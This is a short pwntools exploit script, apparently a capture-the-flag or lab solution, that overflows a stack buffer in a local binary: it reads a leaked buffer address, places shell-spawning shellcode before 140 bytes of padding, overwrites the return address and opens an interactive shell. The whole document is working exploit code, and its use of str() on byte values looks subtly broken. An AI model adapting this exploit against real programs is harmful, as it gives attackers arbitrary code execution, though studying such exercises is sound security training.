from pwn import *

# buffer address: 0xffffc7b0
offset = 140

p = process('./a.out')
shellcode = asm(shellcraft.sh())
buffer_addr = int(p.recvline(), 16)
payload = str(shellcode) + "A" * (offset - len(shellcode)) + str(p32(buffer_addr))

p.sendline(payload)
p.interactive()
